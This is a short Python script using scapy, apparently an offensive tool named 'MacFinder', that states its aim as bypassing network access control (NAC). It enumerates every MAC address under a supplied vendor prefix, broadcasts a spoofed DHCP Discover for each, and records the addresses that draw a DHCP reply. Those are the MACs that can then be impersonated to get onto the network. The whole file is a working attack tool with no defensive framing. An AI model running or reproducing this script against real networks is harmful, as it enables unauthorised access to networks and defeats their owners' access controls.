#!/usr/bin/python3
import argparse
from scapy.all import Ether,IP,UDP,BOOTP,DHCP,srp,conf,mac2str

parser = argparse.ArgumentParser(description="-> Find the perfect MAC to bypass NAC.")
parser.add_argument("-m", help="MAC OUI", required=True, type=str)
parser.add_argument("-o", help="Output file", type=str)
args = parser.parse_args()

conf.checkIPaddr = False
hex_chars = ['{:02x}'.format(x) for x in range(0,256)]
mac_list = []

def generate_all_mac(oui):
    for hex_char1 in hex_chars:
        for hex_char2 in hex_chars:
            for hex_char3 in hex_chars:
                mac_list.append(oui + ':' + hex_char1 + ':' + hex_char2 + ':' + hex_char3 )
    print("[+] Done. Started from " + mac_list[1] + " to " + mac_list[-1] + " .")
    return mac_list

def dhcp_discover(mac):
    discover = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff', type=0x0800) \
             / IP(src='0.0.0.0', dst='255.255.255.255') \
             / UDP(sport=68, dport=67) \
             / BOOTP(chaddr=mac2str(mac)) \
             / DHCP(options=[('message-type','discover'), ('end')])
    ans = srp(discover, multi=True, iface="eth0", timeout=0.005, verbose=0) # timeout to modify if no answer
    return ans

print("""
  __  __                  ______   _               _               
 |  \/  |                |  ____| (_)             | |              
 | \  / |   __ _    ___  | |__     _   _ __     __| |   ___   _ __ 
 | |\/| |  / _` |  / __| |  __|   | | | '_ \   / _` |  / _ \ | '__|
 | |  | | | (_| | | (__  | |      | | | | | | | (_| | |  __/ | |   
 |_|  |_|  \__,_|  \___| |_|      |_| |_| |_|  \__,_|  \___| |_|   
                                                                   
                                                                  
                                                                  """)

if args.m:
    oui = args.m
    print("[+] MAC OUI : " + oui)
else:
    parser.print_help()
    exit()

print("[+] Generating all MAC...")
mac_list = generate_all_mac(oui)

print("[+] Sending DHCP Discover packets...")
for mac in mac_list:
    ans = dhcp_discover(mac)
    if "1" in str(ans[0]):
        print("[+] Valid MAC found :", mac)
        if args.o:
            with open(args.o, 'a') as file:
                file.write(mac + "\n")
